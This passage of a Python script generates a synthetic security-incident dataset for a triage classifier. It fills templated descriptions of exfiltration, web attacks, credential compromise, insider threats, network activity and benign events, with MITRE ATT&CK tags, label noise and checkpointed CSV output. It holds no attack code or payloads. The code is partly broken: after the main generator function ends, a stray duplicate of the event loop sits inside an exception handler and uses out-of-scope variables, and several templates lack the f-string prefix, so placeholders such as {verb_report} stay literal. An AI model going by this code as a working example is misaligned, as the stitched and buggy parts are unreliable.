                f"Indicators match known leak-site patterns and triggered rule '{detection_rule}'."
            )
            short = (
                f"Suspected exfiltration from {device} to dark web-linked host "
                f"{dest_ip}:{dest_port}."
            )
            user_view = (
                f"Security staff {verb_report} discovering outbound traffic from {device} "
                f"to infrastructure associated with dark web leak sites."
            )

        # --- USB Staging + Cloud Upload --------------------------------
        elif combo_usb_cloud:
            usb = random.choice(usb_phrases)
            main = (
                f"{triage_phrase} staged data movement on {device} ({src_ip}). Sensitive "
                f"files were first copied to an {usb} and later uploaded to {cloud} from "
                f"the same host. Outbound traffic flowed to {dest_ip}:{dest_port} in "
                f"{dest_country}. Logs show bulk reads from {file_path}. "
                f"DLP and proxy jointly triggered rule '{detection_rule}'."
            )
            short = (
                f"Staged exfiltration: files copied to {usb}, then uploaded to {cloud}."
            )
            user_view = (
                f"{user} {verb_report} moving files between a USB device and a personal "
                f"{cloud} account to 'back things up', which is unusual for their role."
            )

        # --- Cloud-Only Exfiltration ----------------------------------
        else:
            main = (
                f"{triage_phrase} large outbound transfers from {device} ({src_ip}) to "
                f"{cloud} services at {dest_ip}:{dest_port} in {dest_country}. The timing "
                f"and volume deviate from historical baselines. File access logs show bulk "
                f"reads under {file_path}. DLP and proxy telemetry triggered rule "
                f"'{detection_rule}'."
            )
            short = (
                f"Possible exfiltration: multi-GB transfers to {cloud} from {src_ip}."
            )
            user_view = (
                f"{user} {verb_report} that a large sync or export job appeared to run "
                f"without their initiation, moving many files to a cloud storage location."
            )

    # -----------------------
    # POLICY VIOLATION
    # -----------------------
    elif event_type == "policy_violation":
        mitre_clause = ""
        if mitre_id and mitre_name:
            mitre_clause = (
                f" Policy deviation overlaps with MITRE ATT&CK technique "
                f"{mitre_id} ({mitre_name})."
            )

        if random.random() < 0.5:
            usb = random.choice(usb_phrases)
            main = (
                f"{triage_phrase} that DLP {verb_detect} sensitive files being copied "
                f"to an {usb} connected to {device}. The activity originated from "
                f"{src_ip} and contravenes removable media policy. Rule "
                f"'{detection_rule}' fired on the file classification and destination."
            )
            short = (
                f"DLP {verb_detect} sensitive data copied to {usb} on {device}, "
                f"violating removable media policy."
            )
            user_view = (
                f"{user} {verb_report} attempting to copy work documents to a USB "
                f"drive so they could 'finish work at home'."
            )
        else:
            main = (
                f"{triage_phrase} that {device} is running unauthorized software "
                f"under account {user}. The application accessed network shares and "
                f"attempted to open {file_path} from {src_ip}. This violates "
                f"software installation policy and triggered rule '{detection_rule}'."
            )
            short = (
                f"Unauthorized remote-access or helper tool on {device} under {user}, "
                f"accessing internal resources."
            )
            user_view = (
                f"{user} {verb_report} installing a tool they found online to "
                f"'speed up their work', which is not approved by IT."
            )

        if mitre_clause:
            main += mitre_clause

    # -----------------------
    # WEB ATTACK
    # -----------------------
    elif event_type == "web_attack":
        mitre_clause = ""
        if mitre_id and mitre_name:
            mitre_clause = (
                f" Activity is consistent with MITRE ATT&CK technique "
                f"{mitre_id} ({mitre_name})."
            )

        mode = random.choice(["injection", "bruteforce", "ddos"])
        if mode == "injection":
            main = (
                f"{triage_phrase} repeated HTTP requests from {src_ip} targeting "
                f"{domain}{url_path}. Requests contain SQL injection or script "
                f"payload patterns and triggered multiple WAF rules including "
                f"'{detection_rule}'. Traffic is directed at {dest_ip}:{dest_port}."
            )
            short = (
                f"WAF {verb_detect} injection-style requests from {src_ip} to "
                f"{domain}{url_path}."
            )
            user_view = (
                "No direct user report; suspicious input patterns identified in WAF "
                "logs against the login or search endpoints."
            )
        elif mode == "bruteforce":
            main = (
                f"{triage_phrase} a high rate of failed login attempts against "
                f"{domain}{url_path} from a small set of IPs including {src_ip}. "
                f"Patterns suggest credential stuffing or password spraying rather "
                f"than normal user behavior."
            )
            short = (
                f"Web login brute-force against {domain}{url_path} from clustered IPs "
                f"such as {src_ip}."
            )
            user_view = (
                "Customers reported trouble logging in, and WAF logs show many "
                "failed attempts from a few source IPs."
            )
        else:  # ddos-style
            outage = random.choice(outage_phrases)
            main = (
                f"{triage_phrase} volumetric HTTP traffic targeting {domain}. "
                f"Telemetry shows many source IPs hitting {dest_ip}:{dest_port} and "
                f"{outage} Traffic patterns are consistent with an application-layer "
                f"DoS or DDoS event."
            )
            short = (
                f"Possible web DoS/DDoS: spike in HTTP traffic from many IPs causing "
                f"availability issues for {domain}."
            )
            user_view = (
                "Users and customers {verb_report} that the main website is slow or "
                "unreachable while monitoring shows a large spike in inbound traffic."
            )
        if mitre_clause:
            main += mitre_clause

    # -----------------------
    # CREDENTIAL COMPROMISE
    # -----------------------
    elif event_type == "credential_compromise":
        mitre_clause = ""
        if mitre_id and mitre_name:
            mitre_clause = (
                f" This behavior corresponds to MITRE ATT&CK technique "
                f"{mitre_id} ({mitre_name})."
            )

        # Choose compromise subtype
        mode = random.choice(
            ["mfa_fatigue", "session_hijack", "token_theft", "user_denies"]
        )

        if mode == "mfa_fatigue":
            mfa_detail = random_mfa_anomaly()
            main = (
                f"{triage_phrase} suspicious authentication activity for {user}. "
                f"{mfa_detail} Authentication telemetry shows the login originated from "
                f"{src_ip} ({src_country}), which does not match the user's typical "
                f"locations or devices. The pattern is consistent with MFA fatigue attacks "
                f"where attackers repeatedly prompt legitimate users until they accept. "
                f"Rule '{detection_rule}' triggered on the anomalous device fingerprint and geography."
            )
            short = (
                f"MFA fatigue attack targeting {user}: unusual approval from {src_ip} "
                f"({src_country}) on unrecognized device."
            )
            user_view = (
                f"{user} {verb_report} receiving multiple unexpected MFA prompts and "
                f"accidentally approving one to make them stop."
            )
        elif mode == "session_hijack":
            device_cue = random_device_fingerprint()
            main = (
                f"{triage_phrase} session hijacking for account {user}. Initial authentication "
                f"succeeded from {src_ip}, but subsequent activity shows session tokens being "
                f"reused from {dest_ip} ({dest_country}). {device_cue} Logs indicate the "
                f"attacker maintained access for approximately 45 minutes before detection. "
                f"Rule '{detection_rule}' fired on concurrent sessions from disparate geolocations."
            )
            short = (
                f"Session hijack for {user}: tokens reused from {dest_ip} after initial "
                f"login from {src_ip}."
            )
            user_view = (
                f"{user} {verb_report} being logged out unexpectedly and seeing account "
                f"activity they did not initiate."
            )
        elif mode == "token_theft":
            main = (
                f"{triage_phrase} stolen authentication tokens for {user}. Application "
                f"access tokens were extracted and reused from {dest_ip} ({dest_country}) "
                f"to access sensitive APIs and data repositories on {device}. Token validity "
                f"extended beyond normal expiry windows, suggesting modification or replay "
                f"attacks. Rule '{detection_rule}' detected anomalous API access patterns."
            )
            short = (
                f"Stolen auth tokens: {user}'s API credentials reused from {dest_ip} "
                f"for unauthorized data access."
            )
            user_view = (
                f"{user} {verb_report} receiving alerts about API calls and data exports "
                f"they never authorized."
            )
        else:  # user_denies
            denial = random_user_denial()
            main = (
                f"{triage_phrase} confirmed credential compromise for {user}. Successful "
                f"login from {src_ip} ({src_country}) at unusual hours, followed by "
                f"privilege escalation attempts and access to customer databases. "
                f"When contacted, {denial} Post-incident analysis revealed password was "
                f"likely obtained through credential stuffing from a third-party breach. "
                f"Rule '{detection_rule}' flagged the geographic and temporal anomalies."
            )
            short = (
                f"Confirmed compromise: {user} denies activity from {src_ip} involving "
                f"database access and privilege escalation."
            )
            user_view = (
                f"{user} {verb_report} receiving login notifications for sessions they "
                f"did not initiate and immediately contacted security."
            )

        if mitre_clause:
            main += mitre_clause

    # -----------------------
    # INSIDER THREAT
    # -----------------------
    elif event_type == "insider_threat":
        mitre_clause = ""
        if mitre_id and mitre_name:
            mitre_clause = (
                f" This activity aligns with MITRE ATT&CK technique "
                f"{mitre_id} ({mitre_name})."
            )

        hr_context = random_hr_context()
        hr_timing = random_hr_timing()
        insider_behavior = random_insider_behavior()

        # Choose insider subtype
        mode = random.choice(
            ["data_hoarding", "resignation", "disgruntled", "offboarding"]
        )

        if mode == "data_hoarding":
            main = (
                f"{triage_phrase} concerning behavior from {user}, an {hr_context}. "
                f"The user initiated {insider_behavior} from {device} ({src_ip}), with "
                f"files transferred to external cloud storage at {dest_ip}:{dest_port} "
                f"({dest_country}). Activity volume spiked {hr_timing}, significantly "
                f"deviating from normal work patterns. Combined HR and security telemetry "
                f"triggered rule '{detection_rule}'."
            )
            short = (
                f"Insider threat: {user} ({hr_context}) hoarding sensitive data and "
                f"transferring to external storage."
            )
            user_view = (
                f"{user} claimed to be 'organizing files for knowledge transfer' but "
                f"accessed repositories well beyond their role scope."
            )
        elif mode == "resignation":
            main = (
                f"{triage_phrase} high-risk data access by {user}, a {hr_context}. "
                f"{hr_timing.capitalize()}, the user {insider_behavior} totaling over "
                f"15GB of proprietary code, customer lists, and strategic documents. "
                f"Transfers flowed from {device} to personal cloud accounts at "
                f"{dest_ip}:{dest_port}. DLP and HR correlation {verb_detect} the pattern "
                f"and triggered rule '{detection_rule}'."
            )
            short = f"Resignation risk: {user} exporting 15GB+ of sensitive data {hr_timing}."
            user_view = (
                f"{user} {verb_report} needing to 'back up work samples for their portfolio' "
                f"before leaving the organization."
            )
        elif mode == "disgruntled":
            main = (
                f"{triage_phrase} suspicious file access by {user}, a {hr_context}. "
                f"Following negative performance reviews, the user began {insider_behavior} "
                f"from multiple systems including {device}. Logs show attempted access to "
                f"executive communications, compensation data, and merger documents from "
                f"{src_ip}. HR and security teams jointly {verb_detect} the anomalies and "
                f"rule '{detection_rule}' fired on the privilege escalation attempts."
            )
            short = f"Disgruntled insider: {user} accessing exec/HR files after negative reviews."
            user_view = (
                f"Colleagues {verb_report} {user} asking unusual questions about company "
                f"finances and leadership discussions."
            )
        else:  # offboarding
            main = (
                f"{triage_phrase} offboarding anomalies for {user}, whose termination is "
                f"scheduled within 48 hours. Despite access restrictions, the user {insider_behavior} "
                f"using a secondary account from {device} ({src_ip}). Data included customer PII, "
                f"pricing models, and unreleased product plans, all exported to USB drives and "
                f"personal email at {dest_ip}. EDR and DLP correlation triggered rule '{detection_rule}'."
            )
            short = (
                f"Offboarding threat: {user} bypassing restrictions to export PII and "
                f"IP before termination."
            )
            user_view = (
                f"IT helpdesk {verb_report} {user} requesting 'temporary access extensions' "
                f"to finish handover tasks."
            )

        if mitre_clause:
            main += mitre_clause

    # -----------------------
    # SUSPICIOUS NETWORK ACTIVITY
    # -----------------------
    elif event_type == "suspicious_network_activity":
        mitre_clause = ""
        if mitre_id and mitre_name:
            mitre_clause = (
                f" This network behavior matches MITRE ATT&CK technique "
                f"{mitre_id} ({mitre_name})."
            )

        # Choose network activity subtype
        mode = random.choice(
            ["port_scan", "beaconing", "lateral_movement", "reconnaissance"]
        )

        if mode == "port_scan":
            scan_pattern = random_scanning_pattern()
            main = (
                f"{triage_phrase} internal network reconnaissance originating from {device} "
                f"({src_ip}). IDS telemetry shows {scan_pattern}, suggesting automated "
                f"discovery tools or attacker enumeration. Traffic targeted {dest_ip}:{dest_port} "
                f"and dozens of other internal hosts. The pattern is inconsistent with normal "
                f"IT operations and triggered rule '{detection_rule}'."
            )
            short = f"Port scanning from {src_ip}: {scan_pattern.lower()}."
            user_view = (
                f"IT team {verb_report} unusual firewall denials and IDS alerts from {device}, "
                f"which is not a security scanner appliance."
            )
        elif mode == "beaconing":
            beacon_pattern = random_beaconing_pattern()
            main = (
                f"{triage_phrase} command-and-control-style traffic from {device} ({src_ip}) "
                f"to external infrastructure at {dest_ip}:{dest_port} ({dest_country}). "
                f"NetFlow analysis reveals {beacon_pattern}, consistent with malware callbacks "
                f"or data staging. The destination IP has no legitimate business relationship "
                f"with the organization. Rule '{detection_rule}' fired on the periodic timing "
                f"and payload entropy."
            )
            short = f"C2 beaconing: {src_ip} making periodic callbacks to {dest_ip}:{dest_port}."
            user_view = (
                "No direct user report; discovered through automated NetFlow analysis "
                "detecting unusual egress patterns."
            )
        elif mode == "lateral_movement":
            lateral_cue = random_lateral_movement()
            main = (
                f"{triage_phrase} lateral movement attempts within the internal network. "
                f"Following initial compromise, {lateral_cue} originating from {device} "
                f"({src_ip}). Endpoints contacted include file servers, domain controllers, "
                f"and database hosts around {dest_ip}:{dest_port}. Behavior suggests an "
                f"attacker mapping the environment post-compromise. Rule '{detection_rule}' "
                f"detected the anomalous inter-host communication patterns."
            )
            short = f"Lateral movement: {lateral_cue.lower()} from {src_ip}."
            user_view = (
                f"{user} {verb_report} unexpected authentication prompts and slow system "
                f"performance during the suspected lateral movement window."
            )
        else:  # reconnaissance
            main = (
                f"{triage_phrase} internal reconnaissance activity from {device} ({src_ip}). "
                f"The host performed LDAP queries, DNS zone transfers, and SMB enumeration "
                f"against {dest_ip} and corporate directory services. Timing and scope exceed "
                f"normal administrative tasks and suggest either compromised credentials or "
                f"a malicious insider. IDS and EDR jointly triggered rule '{detection_rule}'."
            )
            short = f"Network reconnaissance: LDAP/DNS/SMB enumeration from {src_ip}."
            user_view = (
                "Security operations {verb_report} IDS alerts for directory queries "
                "from a non-admin workstation outside IT's asset inventory."
            )

        if mitre_clause:
            main += mitre_clause

    # -----------------------
    # BENIGN / OPERATIONAL
    # -----------------------
    elif event_type == "benign_activity":
        benign_mode = random.choice(
            [
                "maintenance",
                "email_outage",
                "web_slow",
                "noise",
                "false_positive",
                "approved_tool",
                "scheduled_scan",
                "legitimate_software",
            ]
        )

        if benign_mode == "maintenance":
            main = (
                f"{triage_phrase} that scheduled maintenance activity on {device} "
                f"from {src_ip} is operating as expected during the approved change window. "
                f"System logs confirm this is authorized patching and backup operations "
                f"with no security concerns. All activity matches documented runbooks "
                f"and change tickets."
            )
            short = (
                "Approved maintenance activity (patching/backups) during scheduled window; "
                "confirmed benign."
            )
            user_view = (
                "Users {verb_report} slow performance during planned maintenance, "
                "but IT confirms this is expected system updates with no security risk."
            )
        elif benign_mode == "email_outage":
            main = (
                f"{triage_phrase} that email delivery delays are caused by "
                f"infrastructure capacity issues, not security threats. Mail server "
                f"logs from {src_ip} and {dest_ip} show normal traffic patterns "
                f"within expected baselines. No phishing indicators, malware, or "
                f"suspicious attachments detected. This is a performance issue only."
            )
            short = "Email performance degradation due to infrastructure load, not security incident."
            user_view = (
                "Users {verb_report} slow email delivery, but security review confirms "
                "normal operations with no malicious content or suspicious patterns."
            )
        elif benign_mode == "web_slow":
            main = (
                f"{triage_phrase} that website performance issues on {device} are "
                f"attributed to recent code deployment and database optimization. "
                f"WAF logs show legitimate customer traffic with no attack patterns. "
                f"Load balancer metrics indicate capacity constraints, not DDoS or "
                f"malicious scanning. This is a normal operational issue."
            )
            short = "Website slowdown linked to deployment and capacity, not malicious activity."
            user_view = (
                "Customers {verb_report} slow page loads, but investigation shows "
                "this is a performance optimization issue with no security implications."
            )
        elif benign_mode == "false_positive":
            main = (
                f"{triage_phrase} that EDR alert on {device} is a false positive. "
                f"The flagged process is a legitimate business application communicating "
                f"with approved cloud services at {dest_ip}:{dest_port}. Security team "
                f"verified the digital signature and confirmed this is authorized software "
                f"operating normally. Tuning rule '{detection_rule}' to reduce noise."
            )
            short = (
                "EDR false positive on legitimate business software; confirmed safe."
            )
            user_view = (
                "{user} {verb_report} an antivirus alert, but IT confirmed it's a "
                "known false positive from approved corporate software."
            )
        elif benign_mode == "approved_tool":
            main = (
                f"{triage_phrase} that network traffic from {device} to {dest_ip}:{dest_port} "
                f"is from approved IT administration tools. System administrators are "
                f"performing routine inventory scans and software updates using authorized "
                f"management platforms. All activity is documented in the change management "
                f"system and poses no security risk."
            )
            short = (
                "Approved IT admin tool traffic; authorized system management activity."
            )
            user_view = (
                "IT staff are running standard system management scans as part of "
                "monthly inventory and compliance checks."
            )
        elif benign_mode == "scheduled_scan":
            main = (
                f"{triage_phrase} that vulnerability scanning activity from {src_ip} "
                f"targeting {device} is part of the quarterly security assessment. "
                f"This is authorized penetration testing and compliance scanning conducted "
                f"by the internal security team. All scans are pre-approved and coordinated "
                f"with IT operations. Results will be reviewed for remediation planning."
            )
            short = "Authorized security scanning as part of quarterly compliance assessment."
            user_view = (
                "Security team is conducting approved vulnerability scans as documented "
                "in the annual security assessment schedule."
            )
        elif benign_mode == "legitimate_software":
            main = (
                f"{triage_phrase} that software update activity on {device} is from "
                f"legitimate vendor update services. The application is downloading "
                f"patches from verified CDN endpoints at {dest_ip} with valid code "
                f"signatures. This is normal auto-update behavior for licensed corporate "
                f"software with no malicious indicators present."
            )
            short = "Legitimate software updates from verified vendor sources; normal operations."
            user_view = (
                "{user} noticed update notifications, but these are routine software "
                "patches from approved vendors with no security concerns."
            )
        else:  # noise
            main = (
                f"{triage_phrase} that authentication events from {src_ip} are "
                f"routine system health checks and monitoring heartbeats. These are "
                f"automated infrastructure tests with no user involvement. All metrics "
                f"remain within normal operational baselines. This is expected background "
                f"activity with no security implications."
            )
            short = "System monitoring and health check traffic; normal background activity."
            user_view = (
                "Automated monitoring systems are performing routine checks. No user "
                "action required; this is standard infrastructure telemetry."
            )

    # -----------------------
    # FALLBACK
    # -----------------------
    else:
        main = (
            f"Generic event for {user} on {device} communicating from {src_ip} "
            f"to {dest_ip}."
        )
        short = main
        user_view = "User description not available for this event."

    # If we have MITRE metadata, annotate the short description with a compact
    # label instead of the full ATT&CK prose (which often ends with "...").
    # This keeps the dataset concise and avoids literal ellipses coming from
    # MITRE snippet text.
    if mitre_id and mitre_name and event_type != "benign_activity":
        short = f"{short} [MITRE {mitre_id} - {mitre_name}]"

    # Return the clean main description here. Noise will be applied *after*
    # any optional LLM rewrite so that prompts to the LLM remain stable.
    return {
        "description": main,
        "description_short": short,
        "description_user_report": user_view,
    }


def build_short_log(event_type, device, src_ip, dest_ip, dest_port, detection_rule):
    return (
        f"{event_type.upper()} on {device} from {src_ip} to {dest_ip}:{dest_port} | "
        f"rule='{detection_rule}'"
    )


# ------------------------
# 4. Main generator
# ------------------------
def maybe_flip_label(event_type: str, p: float = 0.03) -> str:
    """
    Introduce a small amount of realistic label noise.

    With probability p, flip the event_type to a 'nearby' class to simulate
    borderline analyst judgment or imperfect ground truth.

    This helps avoid a perfectly separable dataset and makes evaluation metrics
    look more like real-world SOC data.
    """
    if random.random() > p:
        return event_type  # keep original label most of the time

    # Define "neighbor" classes that are plausible confusions
    neighbors = {
        "data_exfiltration": ["policy_violation", "benign_activity"],
        "policy_violation": ["data_exfiltration", "benign_activity"],
        "web_attack": ["benign_activity", "access_abuse"],
        "benign_activity": ["web_attack", "policy_violation"],
        "access_abuse": ["web_attack", "benign_activity"],
        "phishing": ["benign_activity", "access_abuse"],
        "malware": ["policy_violation", "benign_activity"],
    }

    choices = neighbors.get(event_type, [])
    if not choices:
        return event_type

    return random.choice(choices)


def generate_events(
    n_events: int = 50000,
    outfile: str = "data/cyber_incidents_simulated.csv",
    start_date: str = "2024-01-01",
    end_date: str = "2024-12-31",
    chunk_size: int = 1000,
    checkpoint_file: str | None = None,
    log_file: str | None = None,
    rewrite_report: str | None = None,
) -> None:
    random.seed(42)

    # Setup enhanced logging if specified
    logger = None
    if log_file:
        import logging

        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[logging.FileHandler(log_file), logging.StreamHandler()],
        )
        logger = logging.getLogger(__name__)
        logger.info(f"Starting generation: {n_events} events, chunk_size={chunk_size}")

    # Setup LLM rewrite reporting if specified
    global REWRITE_REPORT_ENABLED, REWRITE_REPORT_PATH
    if rewrite_report:
        REWRITE_REPORT_ENABLED = True
        REWRITE_REPORT_PATH = rewrite_report

    # Load checkpoint if exists and preserve generation start time
    start_event = 1
    generation_start_time = datetime.now(tz=timezone.utc).isoformat()
    if checkpoint_file and os.path.exists(checkpoint_file):
        try:
            with open(checkpoint_file, "r") as f:
                checkpoint = json.load(f)
                start_event = checkpoint.get("last_completed_event", 0) + 1
                # Preserve the original generation start time across restarts
                generation_start_time = checkpoint.get(
                    "generation_start_time", generation_start_time
                )
                if logger:
                    logger.info(
                        f"Resuming from checkpoint: starting at event {start_event}"
                    )
                else:
                    print(
                        f"📁 Resuming from checkpoint: starting at event {start_event}"
                    )
        except Exception as e:
            if logger:
                logger.warning(f"Failed to load checkpoint: {e}")
            else:
                print(f"⚠️  Failed to load checkpoint: {e}")

    # Pre-initialize LLM backend if enabled (before starting progress bar)
    initialize_llm_if_needed()

    start = datetime.fromisoformat(start_date)
    end = datetime.fromisoformat(f"{end_date} 23:59:59")

    # Determine if we're resuming (append) or starting fresh
    file_mode = "a" if (checkpoint_file and start_event > 1) else "w"

    # Collect events in chunks for memory-efficient writing
    events_buffer = []
    total_written = 0
    chunk_count = 0

    with open(outfile, file_mode, newline="", encoding="utf-8") as f:
        writer = csv.writer(f)

        # Write header only if starting fresh
        if file_mode == "w":
            writer.writerow(
                [
                    "event_id",
                    "timestamp",
                    "log_source",
                    "event_type",
                    "severity",
                    "mitre_technique",
                    "mitre_clause",
                    "user",
                    "device",
                    "src_ip",
                    "dest_ip",
                    "src_country",
                    "dest_country",
                    "src_port",
                    "dest_port",
                    "protocol",
                    "detection_rule",
                    "is_true_positive",
                    "description",
                    "description_short",
                    "description_user_report",
                    "short_log",
                ]
            )

        # Main generation loop with chunked writing and checkpointing
        for event_id in tqdm(
            range(start_event, n_events + 1),
            desc="Generating incidents",
            unit="event",
            dynamic_ncols=True,
            initial=start_event - 1,
            total=n_events,
        ):
            event_type = random.choice(EVENT_TYPES)

            # Choose subtype based on event type
            subtype = None
            if event_type == "phishing":
                subtype = choose_phishing_subtype()
            elif event_type == "malware":
                subtype = choose_malware_subtype()
            elif event_type == "access_abuse":
                subtype = choose_access_abuse_subtype()
            elif event_type == "data_exfiltration":
                subtype = choose_data_exfil_subtype()
            elif event_type == "policy_violation":
                subtype = choose_policy_violation_subtype()
            elif event_type == "web_attack":
                subtype = choose_web_subtype()
            elif event_type == "benign_activity":
                subtype = choose_benign_subtype()
            elif event_type == "insider_threat":
                subtype = choose_insider_subtype()
            elif event_type == "credential_compromise":
                subtype = choose_credential_compromise_subtype()
            elif event_type == "suspicious_network_activity":
                subtype = choose_suspicious_network_subtype()

            log_source = choose_log_source(event_type)

            # Choose MITRE technique and build clause
            tech_ids = EVENT_TO_TECHNIQUES.get(event_type, [])
            if tech_ids:
                mitre_id = random.choice(tech_ids)
                # Get technique name from snippets if available
                mitre_snippet = MITRE_SNIPPETS.get(mitre_id, {})
                mitre_name = mitre_snippet.get("name", "")
                mitre_short = mitre_snippet.get("short", "")

                # Build mitre dict for backward compatibility
                mitre = {
                    "id": mitre_id,
                    "name": mitre_name,
                    "short": mitre_short,
                }

                if mitre_name:
                    mitre_clause = f"This activity aligns with MITRE ATT&CK technique {mitre_id} ({mitre_name})."
                else:
                    mitre_clause = (
                        f"This activity aligns with MITRE ATT&CK technique {mitre_id}."
                    )
            else:
                mitre_id = ""
                mitre_clause = ""
                mitre = None

            severity = choose_severity(event_type, subtype)
            is_tp = choose_true_positive(event_type, subtype)
            detection_rule = choose_detection_rule(event_type)

            user = random_user()
            device = random_device()
            src_ip = random_ip()
            dest_ip = random_ip()
            src_country, dest_country = random_countries()
            src_port = random_port_for_event(event_type)
            dest_port = random_port_for_event(event_type)
            protocol = random_protocol()
            timestamp = random_timestamp(start, end).isoformat()

            desc_dict = build_descriptions(
                event_type,
                user,
                device,
                src_ip,
                dest_ip,
                src_country,
                dest_country,
                dest_port,
                detection_rule,
                mitre=mitre,
                subtype=subtype,
            )

            # Apply LLM rewriting if enabled
            if USE_LLM_FOR_GENERATOR:
                desc_dict = llm_rewrite_descriptions(
                    event_type, desc_dict, mitre, event_id
                )

            # Create borderline/ambiguous scenarios for harder classification (20% of events)
            desc_dict = create_borderline_scenario(event_type, desc_dict)

            # Apply synonym augmentation for diversity (40% of events)
            if random.random() < 0.4:
                desc_dict["description"] = augment_with_synonyms(
                    desc_dict["description"], replacement_prob=0.3, max_replacements=3
                )
                if desc_dict.get("description_short"):
                    desc_dict["description_short"] = augment_with_synonyms(
                        desc_dict["description_short"],
                        replacement_prob=0.25,
                        max_replacements=2,
                    )

            # Apply light, token-level noise after any LLM rewrites and synonym augmentation
            desc_dict["description"] = add_noise_to_sentence(desc_dict["description"])

            # Clean up any literal ellipses that may still be present
            if isinstance(desc_dict.get("description_short"), str):
                desc_dict["description_short"] = (
                    desc_dict["description_short"]
                    .replace("…", "...")  # normalize Unicode ellipsis
                    .replace("...", "")  # then remove ellipses entirely
                    .strip()
                )

            # Build short log entry
            short_log = build_short_log(
                event_type, device, src_ip, dest_ip, dest_port, detection_rule
            )

            # Inject label noise for realism
            noisy_event_type = event_type
            if random.random() < LABEL_NOISE_RATE:
                neighbors = NEIGHBOR_LABELS.get(event_type, [])
                if neighbors:
                    noisy_event_type = random.choice(neighbors)

            # Collect event data in buffer
            event_row = [
                event_id,
                timestamp,
                log_source,
                noisy_event_type,
                severity,
                mitre_id,
                mitre_clause,
                user,
                device,
                src_ip,
                dest_ip,
                src_country,
                dest_country,
                src_port,
                dest_port,
                protocol,
                detection_rule,
                is_tp,
                desc_dict["description"],
                desc_dict["description_short"],
                desc_dict["description_user_report"],
                short_log,
            ]
            event_row = sanitize_row(event_row)
            events_buffer.append(event_row)

            # Write chunk when buffer is full
            if len(events_buffer) >= chunk_size:
                chunk_count += 1
                if logger:
                    logger.info(
                        f"Writing chunk {chunk_count} ({len(events_buffer)} events)"
                    )
                else:
                    print(
                        f"📝 Writing chunk {chunk_count}/{((n_events-start_event+1)//chunk_size)+1}..."
                    )

                writer.writerows(events_buffer)
                f.flush()  # Ensure data is written to disk
                total_written += len(events_buffer)
                events_buffer.clear()

                # Update checkpoint
                if checkpoint_file:
                    try:
                        with open(checkpoint_file, "w") as cp_f:
                            json.dump(
                                {
                                    "last_completed_event": event_id,
                                    "total_events": n_events,
                                    "chunks_written": chunk_count,
                                    "generation_start_time": generation_start_time,
                                    "timestamp": datetime.now(
                                        tz=timezone.utc
                                    ).isoformat(),
                                },
                                cp_f,
                                indent=2,
                            )
                    except Exception as e:
                        if logger:
                            logger.warning(f"Failed to update checkpoint: {e}")

        # Write remaining events in buffer
        if events_buffer:
            chunk_count += 1
            if logger:
                logger.info(
                    f"Writing final chunk {chunk_count} ({len(events_buffer)} events)"
                )
            else:
                print(f"📝 Writing final chunk {chunk_count}...")

            writer.writerows(events_buffer)
            f.flush()
            total_written += len(events_buffer)

    # Final checkpoint update
    if checkpoint_file:
        try:
            with open(checkpoint_file, "w") as cp_f:
                json.dump(
                    {
                        "last_completed_event": n_events,
                        "total_events": n_events,
                        "chunks_written": chunk_count,
                        "generation_start_time": generation_start_time,
                        "status": "completed",
                        "timestamp": datetime.now(tz=timezone.utc).isoformat(),
                    },
                    cp_f,
                    indent=2,
                )
        except Exception as e:
            if logger:
                logger.warning(f"Failed to finalize checkpoint: {e}")

    print(f"Wrote {total_written} events to {outfile}")
    if logger:
        logger.info(
            f"Generation completed: {total_written} events written to {outfile}"
        )

    # Write compact metadata JSON file summarizing the generation run
    meta = {
        "generated_at_utc": datetime.now(tz=timezone.utc)
        .isoformat()
        .replace("+00:00", "Z"),
        "n_events": n_events,
        "outfile": outfile,
        "use_llm_for_generator": USE_LLM_FOR_GENERATOR,
        "llm_backend": os.getenv("NLP_TRIAGE_LLM_BACKEND", "").strip(),
        "llm_rewrites_attempted": GEN_LLM_REWRITE_ATTEMPTED,
        "llm_rewrites_applied": GEN_LLM_REWRITE_COUNT,
        "label_noise_rate": LABEL_NOISE_RATE,
        "random_seed": 42,
        "chunk_size": chunk_size,
        "checkpoint_file": checkpoint_file,
        "log_file": log_file,
    }
    meta_path = outfile + ".meta.json"
    with open(meta_path, "w", encoding="utf-8") as mf:
        json.dump(meta, mf, indent=2)

    # Compact summary of LLM rewrites, if enabled
    if USE_LLM_FOR_GENERATOR:
        print(
            f"LLM rewrites: {GEN_LLM_REWRITE_COUNT} applied / {GEN_LLM_REWRITE_ATTEMPTED} attempted"
        )

    # Write optional detailed LLM rewrite report
    if rewrite_report and REWRITE_REPORT:
        try:
            with open(rewrite_report, "w", encoding="utf-8") as rf:
                json.dump(REWRITE_REPORT, rf, indent=2)
            print(f"LLM rewrite report written to {rewrite_report}")
        except Exception as e:
            print(
                f"[GEN-LLM] Failed to write rewrite report to {rewrite_report}: {e}",
                flush=True,
            )

            device = random_device()
            src_ip = random_ip()
            dest_ip = random_ip()
            src_country, dest_country = random_countries()
            src_port = random_port_for_event(event_type)
            dest_port = random_port_for_event(event_type)
            protocol = random_protocol()
            timestamp = random_timestamp(start, end).isoformat()

            desc_dict = build_descriptions(
                event_type,
                user,
                device,
                src_ip,
                dest_ip,
                src_country,
                dest_country,
                dest_port,
                detection_rule,
                mitre=mitre,
            )

            # Optional: let an LLM lightly rewrite/enrich the synthetic narratives
            # while preserving the underlying label and core semantics.
            desc_dict = llm_rewrite_descriptions(
                event_type,
                desc_dict,
                mitre=mitre,
                event_id=event_id,
            )

            # Apply light, token-level noise *after* any LLM rewrites so the
            # LLM sees clean text but the final dataset still has variation.
            desc_dict["description"] = add_noise_to_sentence(desc_dict["description"])

            # Clean up any literal ellipses that may still be present in the short
            # description (for example from legacy data or unexpected inputs).
            if isinstance(desc_dict.get("description_short"), str):
                desc_dict["description_short"] = (
                    desc_dict["description_short"]
                    .replace("…", "...")  # normalize Unicode ellipsis
                    .replace("...", "")  # then remove ellipses entirely
                    .strip()
                )

            short_log = build_short_log(
                event_type, device, src_ip, dest_ip, dest_port, detection_rule
            )

            # --- inject a bit of label noise for realism ---
            noisy_event_type = event_type
            if random.random() < LABEL_NOISE_RATE:
                neighbors = NEIGHBOR_LABELS.get(event_type, [])
                if neighbors:
                    noisy_event_type = random.choice(neighbors)
                    # keep mitre_id as originally chosen for this event

            row = [
                event_id,
                timestamp,
                log_source,
                noisy_event_type,  # use the noisy label here
                severity,
                mitre_id,
                user,
                device,
                src_ip,
                dest_ip,
                src_country,
                dest_country,
                src_port,
                dest_port,
                protocol,
                detection_rule,
                is_tp,
                desc_dict["description"],
                desc_dict["description_short"],
